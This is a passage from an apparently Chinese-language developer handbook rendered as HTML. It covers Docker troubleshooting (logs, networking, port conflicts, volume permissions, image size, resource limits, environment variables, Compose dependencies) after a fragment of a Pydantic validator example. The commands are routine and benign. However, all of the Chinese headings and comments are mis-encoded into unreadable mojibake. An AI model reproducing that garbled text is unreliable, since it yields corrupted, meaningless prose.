    <span class="n">stock</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">int</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="nd">@validator</span><span class="p">(</span><span class="s1">&#39;price&#39;</span><span class="p">)</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">price_must_be_positive</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="n">v</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">v</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s1">&#39;Price must be positive&#39;</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">v</span>

<span class="c1"># éªŒè¯æ•°æ®</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">item</span> <span class="o">=</span> <span class="n">Item</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="s1">&#39;Product&#39;</span><span class="p">,</span> <span class="n">price</span><span class="o">=</span><span class="mf">19.99</span><span class="p">)</span>
<span class="k">except</span> <span class="n">ValidationError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">json</span><span class="p">())</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ğŸ“š ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#06-Engineering-data-storage-solutions">æ•°æ®å­˜å‚¨æ–¹æ¡ˆ</a></li>
        <li><a href="#01-Foundations-javascript-basics">Python ç¼–ç é—®é¢˜</a></li>
        <li><a href="#08-Cheat-Sheets-common-commands">å¸¸ç”¨å‘½ä»¤</a></li>
      </ul>

    </div>

    <div class="section" id="10-Troubleshooting-docker-issues">
      <h2>80. Docker Issues</h2>
      <h1 id="docker-éƒ¨ç½²é—®é¢˜">Docker éƒ¨ç½²é—®é¢˜</h1>

      <p>Docker å®¹å™¨åŒ–éƒ¨ç½²ä¸­çš„å¸¸è§é—®é¢˜åŠè§£å†³æ–¹æ¡ˆã€‚</p>

      <hr />

      <h2 id="å®¹å™¨å¯åŠ¨å¤±è´¥">å®¹å™¨å¯åŠ¨å¤±è´¥</h2>

      <h3 id="é—®é¢˜è¡¨ç°">é—®é¢˜è¡¨ç°</h3>

      <div class="codehilite">
        <pre><span></span><code>Error<span class="w"> </span>response<span class="w"> </span>from<span class="w"> </span>daemon:<span class="w"> </span>Container<span class="w"> </span>xxx<span class="w"> </span>exited<span class="w"> </span>with<span class="w"> </span>code<span class="w"> </span><span class="m">1</span>
</code></pre>
      </div>

      <h3 id="è§£å†³æ–¹æ¡ˆ">è§£å†³æ–¹æ¡ˆ</h3>

      <h4 id="1-æŸ¥çœ‹æ—¥å¿—">1. æŸ¥çœ‹æ—¥å¿—</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æŸ¥çœ‹å®¹å™¨æ—¥å¿—</span>
docker<span class="w"> </span>logs<span class="w"> </span>container_name

<span class="c1"># å®æ—¶æŸ¥çœ‹æ—¥å¿—</span>
docker<span class="w"> </span>logs<span class="w"> </span>-f<span class="w"> </span>container_name

<span class="c1"># æŸ¥çœ‹æœ€è¿‘çš„æ—¥å¿—</span>
docker<span class="w"> </span>logs<span class="w"> </span>--tail<span class="w"> </span><span class="m">100</span><span class="w"> </span>container_name

<span class="c1"># æŸ¥çœ‹å¸¦æ—¶é—´æˆ³çš„æ—¥å¿—</span>
docker<span class="w"> </span>logs<span class="w"> </span>-t<span class="w"> </span>container_name
</code></pre>
      </div>

      <h4 id="2-æ£€æŸ¥å®¹å™¨çŠ¶æ€">2. æ£€æŸ¥å®¹å™¨çŠ¶æ€</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æŸ¥çœ‹æ‰€æœ‰å®¹å™¨ (åŒ…æ‹¬åœæ­¢çš„)</span>
docker<span class="w"> </span>ps<span class="w"> </span>-a

<span class="c1"># æŸ¥çœ‹å®¹å™¨è¯¦ç»†ä¿¡æ¯</span>
docker<span class="w"> </span>inspect<span class="w"> </span>container_name

<span class="c1"># æŸ¥çœ‹å®¹å™¨èµ„æºä½¿ç”¨</span>
docker<span class="w"> </span>stats<span class="w"> </span>container_name
</code></pre>
      </div>

      <h4 id="3-è¿›å…¥å®¹å™¨è°ƒè¯•">3. è¿›å…¥å®¹å™¨è°ƒè¯•</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># è¿›å…¥è¿è¡Œä¸­çš„å®¹å™¨</span>
docker<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>-it<span class="w"> </span>container_name<span class="w"> </span>bash

<span class="c1"># å¦‚æœå®¹å™¨å·²åœæ­¢,ä½¿ç”¨ä¸´æ—¶å®¹å™¨</span>
docker<span class="w"> </span>run<span class="w"> </span>-it<span class="w"> </span>--rm<span class="w"> </span>image_name<span class="w"> </span>bash

<span class="c1"># ä½¿ç”¨ sh (å¦‚æœ bash ä¸å¯ç”¨)</span>
docker<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>-it<span class="w"> </span>container_name<span class="w"> </span>sh
</code></pre>
      </div>

      <h4 id="4-æ£€æŸ¥å¯åŠ¨å‘½ä»¤">4. æ£€æŸ¥å¯åŠ¨å‘½ä»¤</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># docker-compose.yml</span>
<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">app</span><span class="p">:</span>
<span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">myapp:latest</span>
<span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">python app.py</span><span class="w">  </span><span class="c1"># ç¡®ä¿å‘½ä»¤æ­£ç¡®</span>
<span class="w">    </span><span class="c1"># æˆ–ä½¿ç”¨æ•°ç»„æ ¼å¼</span>
<span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;python&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;app.py&quot;</span><span class="p p-Indicator">]</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç½‘ç»œè¿æ¥é—®é¢˜">ç½‘ç»œè¿æ¥é—®é¢˜</h2>

      <h3 id="å®¹å™¨æ— æ³•è®¿é—®å¤–ç½‘">å®¹å™¨æ— æ³•è®¿é—®å¤–ç½‘</h3>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 1. æ£€æŸ¥ DNS é…ç½®</span>
docker<span class="w"> </span>run<span class="w"> </span>--rm<span class="w"> </span>alpine<span class="w"> </span>ping<span class="w"> </span>google.com

<span class="c1"># 2. æŒ‡å®š DNS æœåŠ¡å™¨</span>
docker<span class="w"> </span>run<span class="w"> </span>--dns<span class="w"> </span><span class="m">8</span>.8.8.8<span class="w"> </span>--dns<span class="w"> </span><span class="m">8</span>.8.4.4<span class="w"> </span>myimage

<span class="c1"># 3. docker-compose.yml ä¸­é…ç½®</span>
services:
<span class="w">  </span>app:
<span class="w">    </span>dns:
<span class="w">      </span>-<span class="w"> </span><span class="m">8</span>.8.8.8
<span class="w">      </span>-<span class="w"> </span><span class="m">8</span>.8.4.4

<span class="c1"># 4. æ£€æŸ¥ Docker ç½‘ç»œè®¾ç½®</span>
docker<span class="w"> </span>network<span class="w"> </span>ls
docker<span class="w"> </span>network<span class="w"> </span>inspect<span class="w"> </span>bridge
</code></pre>
      </div>

      <h3 id="å®¹å™¨é—´æ— æ³•é€šä¿¡">å®¹å™¨é—´æ— æ³•é€šä¿¡</h3>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 1. ç¡®ä¿åœ¨åŒä¸€ç½‘ç»œä¸­</span>
docker-compose.yml:
services:
<span class="w">  </span>app:
<span class="w">    </span>networks:
<span class="w">      </span>-<span class="w"> </span>mynetwork
<span class="w">  </span>db:
<span class="w">    </span>networks:
<span class="w">      </span>-<span class="w"> </span>mynetwork

networks:
<span class="w">  </span>mynetwork:
<span class="w">    </span>driver:<span class="w"> </span>bridge

<span class="c1"># 2. ä½¿ç”¨æœåŠ¡åè®¿é—®</span>
<span class="c1"># åœ¨ app å®¹å™¨ä¸­è®¿é—® db å®¹å™¨</span>
ping<span class="w"> </span>db<span class="w">  </span><span class="c1"># è€Œä¸æ˜¯ localhost</span>

<span class="c1"># 3. æ£€æŸ¥é˜²ç«å¢™</span>
sudo<span class="w"> </span>ufw<span class="w"> </span>status
sudo<span class="w"> </span>iptables<span class="w"> </span>-L

<span class="c1"># 4. æ£€æŸ¥ç«¯å£æ˜ å°„</span>
docker<span class="w"> </span>port<span class="w"> </span>container_name
</code></pre>
      </div>

      <h3 id="ç«¯å£å†²çª">ç«¯å£å†²çª</h3>

      <p><strong>é—®é¢˜è¡¨ç°</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code>Error:<span class="w"> </span>Bind<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">0</span>.0.0.0:8080<span class="w"> </span>failed:<span class="w"> </span>port<span class="w"> </span>is<span class="w"> </span>already<span class="w"> </span>allocated
</code></pre>
      </div>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 1. æŸ¥çœ‹ç«¯å£å ç”¨</span>
lsof<span class="w"> </span>-i<span class="w"> </span>:8080<span class="w">  </span><span class="c1"># Linux/Mac</span>
netstat<span class="w"> </span>-ano<span class="w"> </span><span class="p">|</span><span class="w"> </span>findstr<span class="w"> </span>:8080<span class="w">  </span><span class="c1"># Windows</span>

<span class="c1"># 2. ä¿®æ”¹ç«¯å£æ˜ å°„</span>
docker<span class="w"> </span>run<span class="w"> </span>-p<span class="w"> </span><span class="m">8081</span>:8080<span class="w"> </span>myimage<span class="w">  </span><span class="c1"># ä½¿ç”¨å…¶ä»–ä¸»æœºç«¯å£</span>

<span class="c1"># 3. docker-compose.yml</span>
services:
<span class="w">  </span>app:
<span class="w">    </span>ports:
<span class="w">      </span>-<span class="w"> </span><span class="s2">&quot;8081:8080&quot;</span><span class="w">  </span><span class="c1"># host:container</span>

<span class="c1"># 4. åœæ­¢å ç”¨ç«¯å£çš„å®¹å™¨</span>
docker<span class="w"> </span>ps<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="m">8080</span>
docker<span class="w"> </span>stop<span class="w"> </span>container_name
</code></pre>
      </div>

      <hr />

      <h2 id="å·æŒ‚è½½é—®é¢˜">å·æŒ‚è½½é—®é¢˜</h2>

      <h3 id="æ–‡ä»¶æƒé™é”™è¯¯">æ–‡ä»¶æƒé™é”™è¯¯</h3>

      <p><strong>é—®é¢˜è¡¨ç°</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code>PermissionError:<span class="w"> </span><span class="o">[</span>Errno<span class="w"> </span><span class="m">13</span><span class="o">]</span><span class="w"> </span>Permission<span class="w"> </span>denied:<span class="w"> </span><span class="s1">&#39;/app/data/file.txt&#39;</span>
</code></pre>
      </div>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c"># 1. Dockerfile ä¸­è®¾ç½®æ­£ç¡®çš„æƒé™</span>
<span class="k">FROM</span><span class="w"> </span><span class="s">python:3.11</span>

<span class="k">WORKDIR</span><span class="w"> </span><span class="s">/app</span>

<span class="c"># åˆ›å»ºé root ç”¨æˆ·</span>
<span class="k">RUN</span><span class="w"> </span>useradd<span class="w"> </span>-m<span class="w"> </span>-u<span class="w"> </span><span class="m">1000</span><span class="w"> </span>appuser<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span>chown<span class="w"> </span>-R<span class="w"> </span>appuser:appuser<span class="w"> </span>/app

<span class="c"># åˆ‡æ¢ç”¨æˆ·</span>
<span class="k">USER</span><span class="w"> </span><span class="s">appuser</span>

<span class="k">COPY</span><span class="w"> </span>--chown<span class="o">=</span>appuser:appuser<span class="w"> </span>.<span class="w"> </span>.
</code></pre>
      </div>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 2. docker-compose.yml ä¸­æŒ‡å®šç”¨æˆ·</span>
<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">app</span><span class="p">:</span>
<span class="w">    </span><span class="nt">user</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;1000:1000&quot;</span><span class="w">  </span><span class="c1"># UID:GID</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">./data:/app/data</span>
</code></pre>
      </div>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 3. ä¿®æ”¹ä¸»æœºæ–‡ä»¶æƒé™</span>
sudo<span class="w"> </span>chown<span class="w"> </span>-R<span class="w"> </span><span class="m">1000</span>:1000<span class="w"> </span>./data

<span class="c1"># 4. åœ¨å®¹å™¨å†…ä¿®æ”¹æƒé™</span>
docker<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>-u<span class="w"> </span>root<span class="w"> </span>container_name<span class="w"> </span>chown<span class="w"> </span>-R<span class="w"> </span>appuser:appuser<span class="w"> </span>/app/data
</code></pre>
      </div>

      <h3 id="å·æŒ‚è½½å¤±è´¥">å·æŒ‚è½½å¤±è´¥</h3>

      <p><strong>é—®é¢˜è¡¨ç°</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code>Error:<span class="w"> </span>invalid<span class="w"> </span>mount<span class="w"> </span>config:<span class="w"> </span>volume<span class="w"> </span>driver<span class="w"> </span>not<span class="w"> </span>found
</code></pre>
      </div>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 1. ä½¿ç”¨ç»å¯¹è·¯å¾„</span>
<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">app</span><span class="p">:</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">/absolute/path/to/data:/app/data</span><span class="w">  </span><span class="c1"># Linux/Mac</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">C:/absolute/path/to/data:/app/data</span><span class="w">  </span><span class="c1"># Windows</span>

<span class="c1"># 2. ä½¿ç”¨ç›¸å¯¹è·¯å¾„</span>
<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">app</span><span class="p">:</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">./data:/app/data</span><span class="w">  </span><span class="c1"># ç›¸å¯¹äº docker-compose.yml</span>

<span class="c1"># 3. ä½¿ç”¨å‘½åå·</span>
<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">app</span><span class="p">:</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mydata:/app/data</span>

<span class="nt">volumes</span><span class="p">:</span>
<span class="w">  </span><span class="nt">mydata</span><span class="p">:</span>
<span class="w">    </span><span class="nt">driver</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">local</span>

<span class="c1"># 4. Windows è·¯å¾„è½¬æ¢</span>
<span class="c1"># Windows ä¸‹éœ€è¦å…±äº«é©±åŠ¨å™¨</span>
<span class="c1"># Docker Desktop â†’ Settings â†’ Resources â†’ File Sharing</span>
</code></pre>
      </div>

      <hr />

      <h2 id="é•œåƒæ„å»ºé—®é¢˜">é•œåƒæ„å»ºé—®é¢˜</h2>

      <h3 id="æ„å»ºé€Ÿåº¦æ…¢">æ„å»ºé€Ÿåº¦æ…¢</h3>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c"># 1. ä½¿ç”¨å¤šé˜¶æ®µæ„å»º</span>
<span class="k">FROM</span><span class="w"> </span><span class="s">python:3.11</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="s">builder</span>
<span class="k">WORKDIR</span><span class="w"> </span><span class="s">/app</span>
<span class="k">COPY</span><span class="w"> </span>requirements.txt<span class="w"> </span>.
<span class="k">RUN</span><span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>--user<span class="w"> </span>-r<span class="w"> </span>requirements.txt

<span class="k">FROM</span><span class="w"> </span><span class="s">python:3.11-slim</span>
<span class="k">WORKDIR</span><span class="w"> </span><span class="s">/app</span>
<span class="k">COPY</span><span class="w"> </span>--from<span class="o">=</span>builder<span class="w"> </span>/root/.local<span class="w"> </span>/root/.local
<span class="k">COPY</span><span class="w"> </span>.<span class="w"> </span>.
<span class="k">ENV</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/root/.local/bin:<span class="nv">$PATH</span>

<span class="c"># 2. ä¼˜åŒ–å±‚ç¼“å­˜</span>
<span class="c"># æŠŠä¸å¸¸å˜çš„æŒ‡ä»¤æ”¾å‰é¢</span>
<span class="k">FROM</span><span class="w"> </span><span class="s">python:3.11</span>
<span class="k">WORKDIR</span><span class="w"> </span><span class="s">/app</span>

<span class="c"># å…ˆå¤åˆ¶ä¾èµ–æ–‡ä»¶</span>
<span class="k">COPY</span><span class="w"> </span>requirements.txt<span class="w"> </span>.
<span class="k">RUN</span><span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt

<span class="c"># å†å¤åˆ¶ä»£ç </span>
<span class="k">COPY</span><span class="w"> </span>.<span class="w"> </span>.

<span class="c"># 3. ä½¿ç”¨ .dockerignore</span>
.git/
__pycache__/
*.pyc
*.pyo
*.log
.env
node_modules/
</code></pre>
      </div>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 4. ä½¿ç”¨æ„å»ºç¼“å­˜</span>
docker<span class="w"> </span>build<span class="w"> </span>--cache-from<span class="w"> </span>myimage:latest<span class="w"> </span>-t<span class="w"> </span>myimage:new<span class="w"> </span>.

<span class="c1"># 5. ä½¿ç”¨ BuildKit</span>
<span class="nb">export</span><span class="w"> </span><span class="nv">DOCKER_BUILDKIT</span><span class="o">=</span><span class="m">1</span>
docker<span class="w"> </span>build<span class="w"> </span>-t<span class="w"> </span>myimage<span class="w"> </span>.
</code></pre>
      </div>

      <h3 id="é•œåƒè¿‡å¤§">é•œåƒè¿‡å¤§</h3>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c"># 1. ä½¿ç”¨æ›´å°çš„åŸºç¡€é•œåƒ</span>
<span class="c"># âŒ å¤§é•œåƒ (900MB+)</span>
<span class="k">FROM</span><span class="w"> </span><span class="s">python:3.11</span>

<span class="c"># âœ… å°é•œåƒ (100MB+)</span>
<span class="k">FROM</span><span class="w"> </span><span class="s">python:3.11-slim</span>

<span class="c"># âœ… æ›´å°çš„é•œåƒ (50MB+)</span>
<span class="k">FROM</span><span class="w"> </span><span class="s">python:3.11-alpine</span>

<span class="c"># 2. å¤šé˜¶æ®µæ„å»º</span>
<span class="k">FROM</span><span class="w"> </span><span class="s">python:3.11</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="s">builder</span>
<span class="k">WORKDIR</span><span class="w"> </span><span class="s">/build</span>
<span class="k">COPY</span><span class="w"> </span>requirements.txt<span class="w"> </span>.
<span class="k">RUN</span><span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>--prefix<span class="o">=</span>/install<span class="w"> </span>-r<span class="w"> </span>requirements.txt

<span class="k">FROM</span><span class="w"> </span><span class="s">python:3.11-slim</span>
<span class="k">COPY</span><span class="w"> </span>--from<span class="o">=</span>builder<span class="w"> </span>/install<span class="w"> </span>/usr/local
<span class="k">COPY</span><span class="w"> </span>app<span class="w"> </span>/app
<span class="k">WORKDIR</span><span class="w"> </span><span class="s">/app</span>

<span class="c"># 3. æ¸…ç†ç¼“å­˜</span>
<span class="k">RUN</span><span class="w"> </span>apt-get<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span>apt-get<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span>--no-install-recommends<span class="w"> </span>gcc<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span>pip<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span>apt-get<span class="w"> </span>purge<span class="w"> </span>-y<span class="w"> </span>gcc<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span>apt-get<span class="w"> </span>autoremove<span class="w"> </span>-y<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="se">\</span>
<span class="w">    </span>rm<span class="w"> </span>-rf<span class="w"> </span>/var/lib/apt/lists/*

<span class="c"># 4. ä½¿ç”¨ .dockerignore</span>
.git/
*.md
tests/
docs/
</code></pre>
      </div>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 5. æŸ¥çœ‹é•œåƒå±‚</span>
docker<span class="w"> </span><span class="nb">history</span><span class="w"> </span>myimage:latest

<span class="c1"># 6. å‹ç¼©é•œåƒ</span>
docker<span class="w"> </span><span class="nb">export</span><span class="w"> </span>container_name<span class="w"> </span><span class="p">|</span><span class="w"> </span>docker<span class="w"> </span>import<span class="w"> </span>-<span class="w"> </span>myimage:compressed
</code></pre>
      </div>

      <hr />

      <h2 id="èµ„æºé™åˆ¶é—®é¢˜">èµ„æºé™åˆ¶é—®é¢˜</h2>

      <h3 id="å†…å­˜ä¸è¶³">å†…å­˜ä¸è¶³</h3>

      <p><strong>é—®é¢˜è¡¨ç°</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code>Container<span class="w"> </span>killed<span class="w"> </span>due<span class="w"> </span>to<span class="w"> </span>memory<span class="w"> </span>limit
</code></pre>
      </div>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># docker-compose.yml</span>
<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">app</span><span class="p">:</span>
<span class="w">    </span><span class="nt">deploy</span><span class="p">:</span>
<span class="w">      </span><span class="nt">resources</span><span class="p">:</span>
<span class="w">        </span><span class="nt">limits</span><span class="p">:</span>
<span class="w">          </span><span class="nt">memory</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">512M</span>
<span class="w">        </span><span class="nt">reservations</span><span class="p">:</span>
<span class="w">          </span><span class="nt">memory</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">256M</span>

<span class="c1"># æˆ–ä½¿ç”¨æ—§è¯­æ³•</span>
<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">app</span><span class="p">:</span>
<span class="w">    </span><span class="nt">mem_limit</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">512m</span>
<span class="w">    </span><span class="nt">mem_reservation</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">256m</span>
</code></pre>
      </div>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># Docker run å‘½ä»¤</span>
docker<span class="w"> </span>run<span class="w"> </span>-m<span class="w"> </span>512m<span class="w"> </span>--memory-reservation<span class="w"> </span>256m<span class="w"> </span>myimage

<span class="c1"># æŸ¥çœ‹å®¹å™¨å†…å­˜ä½¿ç”¨</span>
docker<span class="w"> </span>stats<span class="w"> </span>container_name
</code></pre>
      </div>

      <h3 id="cpu-é™åˆ¶">CPU é™åˆ¶</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">app</span><span class="p">:</span>
<span class="w">    </span><span class="nt">deploy</span><span class="p">:</span>
<span class="w">      </span><span class="nt">resources</span><span class="p">:</span>
<span class="w">        </span><span class="nt">limits</span><span class="p">:</span>
<span class="w">          </span><span class="nt">cpus</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;0.5&#39;</span><span class="w">  </span><span class="c1"># é™åˆ¶ä½¿ç”¨ 0.5 ä¸ª CPU</span>
<span class="w">        </span><span class="nt">reservations</span><span class="p">:</span>
<span class="w">          </span><span class="nt">cpus</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;0.25&#39;</span>

<span class="c1"># æˆ–</span>
<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">app</span><span class="p">:</span>
<span class="w">    </span><span class="nt">cpus</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">0.5</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç¯å¢ƒå˜é‡é—®é¢˜">ç¯å¢ƒå˜é‡é—®é¢˜</h2>

      <h3 id="ç¯å¢ƒå˜é‡æœªç”Ÿæ•ˆ">ç¯å¢ƒå˜é‡æœªç”Ÿæ•ˆ</h3>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 1. docker-compose.yml ä¸­è®¾ç½®</span>
<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">app</span><span class="p">:</span>
<span class="w">    </span><span class="nt">environment</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">DEBUG=true</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">DB_HOST=database</span>

<span class="c1"># 2. ä» .env æ–‡ä»¶åŠ è½½</span>
<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">app</span><span class="p">:</span>
<span class="w">    </span><span class="nt">env_file</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">.env</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">.env.local</span>

<span class="c1"># 3. ä»ä¸»æœºç¯å¢ƒç»§æ‰¿</span>
<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">app</span><span class="p">:</span>
<span class="w">    </span><span class="nt">environment</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">HOME</span><span class="w">  </span><span class="c1"># ä»ä¸»æœºç»§æ‰¿ HOME å˜é‡</span>
</code></pre>
      </div>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># 4. è¿è¡Œæ—¶æŒ‡å®š</span>
docker<span class="w"> </span>run<span class="w"> </span>-e<span class="w"> </span><span class="nv">DEBUG</span><span class="o">=</span><span class="nb">true</span><span class="w"> </span>-e<span class="w"> </span><span class="nv">DB_HOST</span><span class="o">=</span>localhost<span class="w"> </span>myimage

<span class="c1"># 5. æŸ¥çœ‹å®¹å™¨ç¯å¢ƒå˜é‡</span>
docker<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>container_name<span class="w"> </span>env
</code></pre>
      </div>

      <hr />

      <h2 id="docker-compose-é—®é¢˜">Docker Compose é—®é¢˜</h2>

      <h3 id="æœåŠ¡å¯åŠ¨é¡ºåº">æœåŠ¡å¯åŠ¨é¡ºåº</h3>

      <p><strong>é—®é¢˜</strong>: æœåŠ¡é—´æœ‰ä¾èµ–å…³ç³»</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">app</span><span class="p">:</span>
<span class="w">    </span><span class="nt">depends_on</span><span class="p">:</span>
<span class="w">      </span><span class="nt">db</span><span class="p">:</span>
<span class="w">        </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">service_healthy</span>
<span class="w">      </span><span class="nt">redis</span><span class="p">:</span>
<span class="w">        </span><span class="nt">condition</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">service_healthy</span>

<span class="w">  </span><span class="nt">db</span><span class="p">:</span>
<span class="w">    </span><span class="nt">healthcheck</span><span class="p">:</span>
<span class="w">      </span><span class="nt">test</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;CMD&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;pg_isready&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;-U&quot;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&quot;postgres&quot;</span><span class="p p-Indicator">]</span>
<span class="w">      </span><span class="nt">interval</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">5s</span>
<span class="w">      </span><span class="nt">timeout</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">5s</span>
